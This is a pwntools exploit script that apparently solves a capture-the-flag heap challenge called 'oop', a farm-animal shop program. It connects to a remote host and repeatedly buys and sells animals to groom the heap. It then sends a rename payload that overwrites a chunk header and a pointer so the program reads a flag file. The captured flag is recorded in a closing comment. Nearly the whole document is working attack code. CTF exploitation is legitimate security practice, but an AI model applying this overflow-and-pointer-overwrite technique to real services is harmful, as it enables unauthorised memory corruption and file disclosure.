from pwn import *

#p = process('./oop')
p = remote('193.57.159.27','30382')


def cmd(ch):
    p.sendlineafter('> ',str(ch))

def List():
    cmd(1)

def Sell(idx):
    cmd(2)
    p.sendlineafter('Which animal? ',str(idx))
    cmd(1)

def Buy(type,name):
    #1 = Pig(150)
    #2 = Cow(250)
    cmd(3)
    cmd(type)
    p.sendlineafter('What will you name your new animal? ',name)

def Rename(idx,name):
    cmd(2)
    p.sendlineafter('Which animal? ',str(idx))
    cmd(3)
    p.sendlineafter('What will you name your new animal? ',name)

def Translator(idx):
    cmd(2)
    p.sendlineafter('Which animal? ',str(idx))
    cmd(4)


#context.log_level = 'debug'
Buy(1,'A'*0x8)
for i in range(10):
    List()
    p.recvuntil('Age: ')
    age = int(p.recvuntil(',')[:-1])
    print('Age: {}'.format(age))
    if age >= 8 and age <= 10:
        break
Sell(0)
Buy(1,'A'*0x8)
for i in range(10):
    List()
    p.recvuntil('Age: ')
    age = int(p.recvuntil(',')[:-1])
    print('Age: {}'.format(age))
    if age >= 8 and age <= 10:
        break
Sell(0)
Buy(1,'A'*0x8)
for i in range(10):
    List()
    p.recvuntil('Age: ')
    age = int(p.recvuntil(',')[:-1])
    print('Age: {}'.format(age))
    if age >= 8 and age <= 10:
        break
Sell(0)
Buy(1,'A'*0x8)
for i in range(10):
    List()
    p.recvuntil('Age: ')
    age = int(p.recvuntil(',')[:-1])
    print('Age: {}'.format(age))
    if age >= 8 and age <= 10:
        break
Sell(0)



Buy(1,'A'*0x8)
Buy(1,'B'*0x8)

payload = 'A'*0x4+'C'*0x10+p64(0)+p64(0x41)+p64(0x404d78)+'flag'

Rename(0,payload)
List()

cmd(4)
Translator(1)


p.interactive()
#rarctf{C0w_s4y_m00_p1g_s4y_01nk_fl4g_s4y-251e363a}